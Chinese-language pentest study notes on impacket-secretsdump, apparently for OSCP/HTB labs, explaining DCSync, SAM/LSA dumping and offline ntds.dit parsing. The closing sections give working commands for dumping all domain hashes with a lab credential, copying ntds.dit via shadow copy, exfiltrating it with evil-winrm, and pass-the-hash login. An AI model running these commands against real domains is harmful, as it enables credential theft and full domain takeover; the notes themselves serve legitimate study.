# impacket-secretsdump

## 介绍

impacket-secretsdump的核心目标是导出windows/ad里的凭据材料（常见是NTLMHash、Kerberos keys、缓存凭据等）它通常走三条路

（1）DCSync/DRSUAPI（域环境，远程拉NTDS）

​	通过模拟域控“目录复制”，从DC侧把用户的hash/密钥复制出来。PWK里明确写到它会用DRSUAPI方式拿NTDS.DIT secrets

​	这条路本质是“复制协议”，不是在DC上落地执行payload。

（2）远程SAM/LSA（单机本地账户/缓存凭据）

​	适用于你已经有目标主机较高权限（通常本地管理员）时，通过远程调用把注册表hive（SAM/SECURTITY等）相关数据导出/读取。

​	安全检测视角经常提到它会通过MS-RPC触发并经由SMB读取临时导出内容。

（3）离线解析（拿到ntds.dit+SYSTEM后本地解密）

​	如果你已经“合法拿到”ntds.dit和Systemhive（比如备份/影子拷贝/取证镜像），secretsdump可以在你本机把他们解密解析。

​	PWK示例就是给-ntds和-system，并用LOCAL表示本地解析。

## 需要什么权限？

（1）DCSync（DRSUAPI）：需要发起目录复制的权限。PWK里明确提到通常是Domain Admins/Enterprise Admins/Administrators这类组，或被单独赋予复制相关权限的账号。

（2）远程SAM/LSA：通常需要目标主机的本地管理员（以及远程管理/注册表访问能力）

（3）离线解析：不要求你对DC在线有复制权限，但你 必须已经合法获得ntds.dit与system（或等价密钥材料）

## 参数

### 1）目标与认证相关

| 参数         | 含义                         | 情况                                 |
| ------------ | ---------------------------- | ------------------------------------ |
| 域/用户@目标 | 指定认证身份+连接目标        | 几乎所有场景；目标可以是DC或成员主机 |
| -k           | 使用KerberOS进行认证（票据） | 已经有TGT/TGS，不想明文或hash        |
| -no-pass     | 不提示输入密码               | 常于-k或已有凭据配合                 |
| -hashes      | 使用NTLM hash进行认证        | “hash 登录”                          |
| -aesKey      | 使用Kerberos Aes Key 认证    | AES-only 域或证书/票据链路           |
| -dc-ip       | 显示指定域控ip               | DNS不通，或多DC环境下避免歧义        |

### 2）输出控制范围（域控/NTDS/DCSync相关）

| 参数                 | 作用范围   | 核心作用                             | 风险/噪音 |
| -------------------- | ---------- | ------------------------------------ | --------- |
| -just-dc             | 域控/NTDS  | 只导出域数据库相关凭据               | 高        |
| -just-dc-user <user> | 单个域用户 | 只复制指定用户的凭据                 | 低噪音    |
| -just-dc-ntlm        | 域用户     | 只要NTLM Hash（不包含Kerberos keys） | 较低      |
| (无参数类)           | DC+本机    | 域+本机全部一起                      | 最大      |

### 3）离线解析（本地文件）

| 参数           | 输入        | 用途                   | 场景               |
| -------------- | ----------- | ---------------------- | ------------------ |
| -ntds <file>   | ntds.dit    | 提供AD数据库           | 已拿到DC数据文件   |
| -system <file> | System hive | 解密NTDS所需的系统密钥 | 与ntds.dit成对     |
| LOCAL          | 本机        | 告诉工具不要远程连接   | 取证/备份/离线分析 |

## ntds.dit和SYSTEM hive是什么？

### 1）ntds.dit是什么？（NT Directory Service database）（NT目录服务数据库）

（1）NTDS.dit是Active Directory域数据库文件（只有域控上有）

（2）里面存了域里的对象数据：用户/组/计算机/策略等，以及最关键的：账号的密码相关数据（以hash/密钥形式存储）

（3）默认位置通常在域控的：“C:\\Windows\\NTDS\\ntds.dit”（具体路径也可能改过，AD安装可自定义）

### 2）SYSTEMhive是什么？（SYSTEM注册表Hive）（系统蜂巢）

（1）SYSTEM hive 是Windows注册表的一部分（文件形式存在磁盘上），包括系统启动与配置数据

（2）对于“离线解析凭据”来说，它最关键是提供解密SAM/NTDS所需的系统密钥材料。（例如bootkey相关）

（3）文件通常在：“c:\\windows\\System32\\config\\System”

### 3）为什么经常要“ntds.dit和SYSTEM hive”一起

（1）ntds.dit里的敏感字段（例如密码hash）不是明文可读，会被系统密钥保护

（2）SYSTEM hive提供了解密所需的关键材料

​	所以离线分析时，经常要把ntds.dit和SYSTEM成对拿到，否则数据无法正确解开。

## ntds.dit和SYSTEM hive通常如何拿到？

1）通过备份/恢复流程

​	（1）域控系统状态备份（System State Backup）或整机备份里会包含AD数据库和注册表hive

​	（2）这类方式是运维最常用、审计也能讲清楚路径

2）通过灾备/快照/镜像（取证常见）

​	（1）从虚拟化平台快照、磁盘镜像、灾备副本中获取对应文件（离线挂载后提取）

3）AD的“安装介质/离线维护数据”

​	（1）AD支持导出用于恢复/部署的介质（本质是合规的数据副本），在一些组织用于分支机构部署/灾备。

| 方法                      | 所需权限                          | 适用场景                     | 工具/命令示例                                             | 备注                       |
| ------------------------- | --------------------------------- | ---------------------------- | --------------------------------------------------------- | -------------------------- |
| DCSync                    | Replicating Directory Changes All | 已打下高权限账号             | impacket-secretsdump -just-dc 或 Mimikatz lsadump::dcsync | 最干净、最快，无需登录域控 |
| 直接复制文件(Shadow Copy) | 域控本地管理员权限                | 已拿到域控SYSTEM             | vssadmin create shadow /for=C: 然后copy文件               | 经典方法，但需域控 shell   |
| 磁盘镜像/导出             | 域控本地管理员权限                | 有域控shell                  | diskshadow / ntdsutil / PowerShell Export-Registry        | 较慢，但稳定               |
| Mimikatz lsadump::sam     | 本地管理员权限                    | 非域控机器，但想先拿本地 SAM | mimikatz "lsadump::sam"                                   | 仅本地账户，不含域哈希     |

### 1）DCSync（OSCP/HTB 首选）

```
# 方法1：impacket-secretsdump（最推荐）
impacket-secretsdump administrator.htb/ethan:limpbizkit@DC_IP -just-dc -outputfile domain_hashes

# 方法2：Mimikatz（在域控 shell 上执行）
mimikatz # lsadump::dcsync /domain:administrator.htb /all /csv

输出文件 domain_hashes.ntds 包含所有用户 NTLM 哈希。
直接看到 Administrator 的哈希，然后用 PTH 登录域控：Bashevil-winrm -i DC_IP -u Administrator -H 'Administrator的NT哈希'
```

### 2）传统 Shadow Copy + 文件复制（如果有域控 shell）

```
# 1. 创建影子卷
vssadmin create shadow /for=C:

# 2. 复制 ntds.dit 和 SYSTEM（影子卷路径会显示，比如 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX）
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# 3. 下载到 Kali
# 在 evil-winrm 中：download C:\temp\ntds.dit
# download C:\temp\SYSTEM

然后在 Kali 用 impacket-ntdsutil 或 secretsdump 提取：
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

